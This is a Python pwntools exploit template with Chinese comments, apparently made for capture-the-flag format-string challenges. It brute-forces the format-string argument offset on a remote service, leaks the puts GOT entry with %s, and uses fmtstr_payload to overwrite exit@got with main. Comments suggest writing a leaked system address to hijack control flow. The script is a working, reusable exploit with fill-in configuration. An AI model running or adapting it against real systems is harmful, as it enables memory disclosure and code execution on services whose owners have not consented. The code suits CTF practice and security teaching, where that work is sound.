#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: 格式化字符串模板 —— 偏移探测 + fmtstr_payload 任意写 + 泄露 GOT
适用条件:
    - printf/snprintf 等把用户输入当格式串(%s %n 可用)
    - 32 位与 64 位都适用, 偏移自动探测
    - 典型用法: 覆写 GOT 拿控制流 / 泄露 libc 栈地址
用法:
    1) 改 CONFIG 区: HOST/PORT/BINARY
    2) write_demo 里改 目标地址/写入值 (示例: exit@got -> main 形成死循环再打第二轮)
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
ARCH = 64                   # TODO: 改这里: 64 / 32
# =============================================================

context.log_level = "info"
context.arch = "amd64" if ARCH == 64 else "i386"
elf = ELF(BINARY, checksec=False)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def probe_offset():
    """探测格式串参数偏移: 发送 AAAA%A$n$p 定位 0x41414141 出现的第几号参数"""
    marker = b"AAAAAAAA"
    for i in range(1, 60):
        io = start()
        io.sendlineafter(b">", marker + f"%{i}$p".encode())  # TODO: 改这里: 提示符
        try:
            resp = io.recvline(timeout=1)
        except EOFError:
            io.close()
            continue
        io.close()
        if hex(0x41414141)[2:].encode() in resp or b"0x4141414141414141" in resp:
            log.success(f"offset = {i}")
            return i
    log.failure("没找到偏移, 换 marker 或确认格式串漏洞")
    return None


def fmt_leak(io, offset):
    """用 %s 泄露任意地址内容: 先用 %n$p 把地址压上去再 %m$s 解引用"""
    if ARCH == 64:
        # 64 位: 地址放 payload 末尾, 8 字节对齐
        addr = elf.got["puts"]
        payload = f"%{offset + 1}$s".encode().ljust(16, b"a") + p64(addr)
    else:
        addr = elf.got["puts"]
        payload = f"%{offset + 2}$s".encode() + b"|aaaa" + p32(addr)
    io.sendlineafter(b">", payload)   # TODO: 改这里: 提示符
    data = io.recvline()
    log.success(f"puts@got 内容(被 puts 截断到 \\x00 前): {data}")
    return data


def fmt_write(io, offset):
    """fmtstr_payload 任意写: 一次写多个地址, 默认 4 字节对齐, 建议分 hw/short 段写"""
    target = elf.got["exit"]          # TODO: 改这里: 目标地址, 如 printf@got
    value = elf.symbols["main"]       # TODO: 改这里: 要写的值, 如 system 地址(需先泄露 libc)
    payload = fmtstr_payload(offset, {target: value})
    log.info(f"payload len = {len(payload)}")
    io.sendlineafter(b">", payload)   # TODO: 改这里: 提示符


def pwn():
    offset = probe_offset()
    if offset is None:
        return

    io = start()
    # 老套路: 32 位一般 6-10, 64 位一般 6-12, 探测结果直接用
    fmt_leak(io, offset)      # 泄露阶段(需要 libc 时在这算基址)
    fmt_write(io, offset)     # 写入阶段

    io.sendlineafter(b">", b"quit")   # 触发 exit -> 跳回 main (示例死循环)
    io.interactive()


if __name__ == "__main__":
    pwn()
